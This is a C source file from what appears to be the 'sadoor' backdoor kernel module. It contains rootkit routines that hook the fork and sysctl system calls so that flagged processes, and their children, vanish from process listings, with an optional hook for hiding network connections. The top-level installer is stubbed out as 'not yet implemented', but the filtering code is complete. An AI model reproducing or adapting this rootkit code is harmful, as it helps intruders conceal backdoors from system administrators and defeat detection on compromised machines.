/*
 *  File: hide_module.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: Process hiding routines
 *  Version: 1.0
 *  Date: Tue Jul 29 17:05:27 CEST 2003 
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met: 
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */     

#include <sys/param.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysctl.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <sys/syscallargs.h>
#include <sys/unistd.h>

#include "sadoor.h"

#ifdef SAKMOD_HIDE_PROCS

/* Process flags in info structure, used by hide_procs_sysctl only */
#define KINFO_FLAG	kpr.kp_eproc.e_flag

/* New functions */
static int hide_procs_fork(struct proc *, void *, register_t *);
static int hide_procs_sysctl(struct proc *, void *, register_t *);

/* Saved function pointers */
static sy_call_t *saved_fork_sycall;
static sy_call_t *saved_sysctl_sycall;

/*
 * Hide processes, not yet implemented.
 */
void
hide_procs(void)
{
    int s;

	log(1, "Hiding of processes not yet implemented\n");
	return;

    splhigh();

        /* Save and replace SYS_fork */
        debug(2, "Replacing fork\n");
        saved_fork_sycall = sysent[SYS_fork].sy_call;
        sysent[SYS_fork].sy_call = hide_procs_fork;
		debug(3, "fork replaced\n");

        /* Save and replace SYS___sysctl */
        debug(2, "Replacing sysctl\n");
        saved_sysctl_sycall = sysent[SYS___sysctl].sy_call;
        sysent[SYS___sysctl].sy_call = hide_procs_sysctl;
		debug(3, "sysctl replaced\n");
    splx(s);
}

/*
 * Restore the replaced functions
 */
void
hide_procs_restore(void)
{
    int s;
	return;

    splhigh();
        
        /* Restore SYS_fork */
        debug(2, "Restoring fork\n");
        sysent[SYS_fork].sy_call = saved_fork_sycall;

        /* Restore sysctl */
        debug(2, "Restoring sysctl\n");
        sysent[SYS___sysctl].sy_call = saved_sysctl_sycall;    

    splx(s);
}

/*
 * The new fork syscall
 * Add the hidden flag to the child if the parent is hidden.
 */
static int
hide_procs_fork(struct proc *p, void *dummy, register_t *retval)
{
    int error;
	
	debug(3, "pid %d entered hide_procs_fork\n", curproc->p_pid);

    error = fork1(p, SIGCHLD, FORK_FORK, NULL, 0, NULL, NULL, retval);
    if (error == 0) {
		struct proc *p2;

		p2 = pfind(retval[0]);

        /* Add hidden flag */
        if (p->p_flag & SAKMOD_HIDDEN_PROC_FLAG) {
            debug(3, "Hiding child process %d\n", p2->p_pid);
            p2->p_flag |= SAKMOD_HIDDEN_PROC_FLAG;
        }
    }
    return(error);
}

/*
 * The new sysent syscall.
 * Let the real sysctl function handle the request and 
 * filter out all hidden processes in the answer.
 */
static int
hide_procs_sysctl(struct proc *p, void *arg, register_t *retval)
{
    struct sys___sysctl_args *uap;
    int mib[4];
	struct kinfo_proc kpr;
    size_t size;               /* Size to return */
    register_t error;          /* Return value from real sysctl function */
    int i;
 
 debug(3, "pid %d entered hide_procs_sysctl\n", curproc->p_pid);
 
    /* Call the real sysctl function */
    if ( (error = saved_sysctl_sycall(p, arg, retval))) {
        debug(3, "hide_procs_sysctl(): Real sysctl returned error (%d)\n", error);
        return(error);
    }
    uap = (struct sys___sysctl_args *)arg;

    /* Copy mib from userspace */
    copyin(SCARG(uap, name), mib, sizeof(mib));

#ifdef SAKMOD_HIDE_CONNECTION
	/* If connections should be hidden, this is the new __sysctl funtion,
	 * so just pass everything on */
    if ((mib[0] == CTL_NET) && (mib[1] == PF_INET) && 
            (mib[2] == IPPROTO_TCP)) /* && (mib[3] == TCPCTL_PCBLIST)) */
        return(hide_conns_sysctl(p, arg, retval));
#endif /* SAKMOD_HIDE_CONNECTION */

    /* No need to continue if it's not a process request */
    if ((mib[0] != CTL_KERN) || (mib[1] != KERN_PROC))
        return(error);

#ifdef SAKMOD_UNHIDE_FOR_HIDDEN_PROC
    /* If the request came from a hidden process, do not hide anything */
    if (p->p_flag & SAKMOD_HIDDEN_PROC_FLAG) {
        debug(2, "hide_procs_sysctl(): Request from hidden process, returning all\n");
        return(error);
    }
#endif /* SAKMOD_UNHIDE_FOR_HIDDEN_PROC */

    /* Request for information about a specific process */
    if ((mib[2] == KERN_PROC_PID) || (mib[2] == KERN_PROC_ARGS)) {
        
        /* In this case, it's a request for the size only (to allocate memory),
         * the "real" request is performed later, and if the process is hidden
         * zero is returned */
        if (SCARG(uap, old) == NULL) {
            debug(3, "Request for single process, but uap->old is NULL\n");
            return(0);
        }

		copyin(SCARG(uap, old), &kpr, sizeof(kpr));

        /* Is the requested process hidden? */
        if (KINFO_FLAG & SAKMOD_HIDDEN_PROC_FLAG) {
			
        	debug(2, "Request for hidden process, returning zero size\n");
    
            /* Return size of zero (no such process) */
            size = 0;
            copyout(&size, SCARG(uap, oldlenp), sizeof(size));
            return(0);
        }
        /* We are done here, hand over the process information */
        else 
            return(0);
    }
    /* Request for a block of processes:
     * KERN_PROC_ALL - Everything
     * KERN_PROC_PGRP - by process group id
     * KERN_PROC_SESSION - by session of pid
     * KERN_PROC_TTY - by controlling tty
     * KERN_PROC_UID - by effective uid
     * KERN_PROC_RUID - by real uid */
    else {

        /* Get the returned size */
        copyin(SCARG(uap, oldlenp), &size, sizeof(size));

        /* Remove the hidden processes from the array
         * and decrease the size */
        if (SCARG(uap, old) != NULL) {

            debug(2, "Got %u processes in response from real sysctl\n", 
                size/(u_int)sizeof(kpr));

            for (i=0; i*sizeof(kpr) < size; i++) {
				
				copyin((u_char *)SCARG(uap, old) + i*sizeof(kpr), &kpr, sizeof(kpr));

        		/* Decrement size and overlap if the process is hidden */
				if (KINFO_FLAG & SAKMOD_HIDDEN_PROC_FLAG) {
           			debug(2, "Found hidden process in response (kpr, %d)\n", KINFO_FLAG);

           			bcopy((u_char *)SCARG(uap, old)+(i+1)*sizeof(kpr), 
           				(u_char *)SCARG(uap, old)+i*sizeof(kpr), size-(i+1)*sizeof(kpr));
                    
           			size -= sizeof(kpr);
            
            		/* We don't want to miss the process used to overlap
            		 * the hidden one */
            		i--;
            	}
            }

            /* Set the new size and return */
            copyout(&size, SCARG(uap, oldlenp), sizeof(size));
            return(0);
        }
    }

    return(error);
}

#endif /* SAKMOD_HIDE_PROCS */
